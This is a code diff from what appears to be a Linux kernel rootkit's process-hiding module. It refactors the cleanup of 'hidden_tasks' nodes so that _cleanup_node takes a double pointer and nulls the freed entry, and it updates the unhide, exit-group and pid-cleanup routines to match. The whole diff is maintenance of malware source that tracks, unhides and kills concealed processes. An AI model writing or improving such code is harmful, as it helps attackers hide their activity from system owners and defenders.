@@ -85,16 +85,15 @@ static int _hide_task(void *data) {
     return 0;
 }
 
-static void _cleanup_node(struct hidden_tasks *node) {
+static void _cleanup_node(struct hidden_tasks **node) {
     if (!node)
         return;
 
-    list_del(&node->list);
-    if(node->fnode) /* can be NULL if kernel task */
-        kfree(node->fnode);
-    node->saddr = 0;
-    kfree(node);
-    node = NULL;
+    list_del(&(*node)->list);
+    if((*node)->fnode) /* can be NULL if kernel task */
+        kfree((const void*)(*node)->fnode);
+    kfree((const void*)*node);
+    *node = NULL;
 }
 
 static void _cleanup_node_list(struct task_struct *task) {
@@ -102,7 +101,7 @@ static void _cleanup_node_list(struct task_struct *task) {
     list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
         if (task != node->task)
             continue;
-        _cleanup_node(node);
+        _cleanup_node(&node);
         break;
     }
 }
@@ -220,7 +219,7 @@ static void _unhide_children(struct task_struct *task) {
             if ((status = stop_machine(_unhide_task, node, NULL))) {
                 prerr("!!!! Error unhide_task %p: %d\n", node->task, status);
             } else {
-                _cleanup_node(node);
+                _cleanup_node(&node);
 #ifdef DEBUG_RING_BUFFER
                 --ht_num;
 #endif
@@ -358,7 +357,8 @@ void kv_unhide_task_by_pid_exit_group(pid_t pid) {
         if (!node->saddr) continue;
 
         task = node->task;
-        _cleanup_node(node);
+        _cleanup_node(&node);
+
         _kill_task(task);
 #ifdef DEBUG_RING_BUFFER
         --ht_num;
@@ -381,7 +381,7 @@ void kv_pid_cleanup(void) {
         if (node->saddr)
             continue;
 
-        _cleanup_node(node);
+        _cleanup_node(&node);
 #ifdef DEBUG_RING_BUFFER
         --ht_num;
 #endif
@@ -390,7 +390,7 @@ void kv_pid_cleanup(void) {
         struct task_struct *task = node->task;
 
         prinfo("cleaning [%p] %s : %d\n", task, task->comm, task->pid);
-        _cleanup_node(node);
+        _cleanup_node(&node);
         _kill_task(task);
 #ifdef DEBUG_RING_BUFFER
         --ht_num;
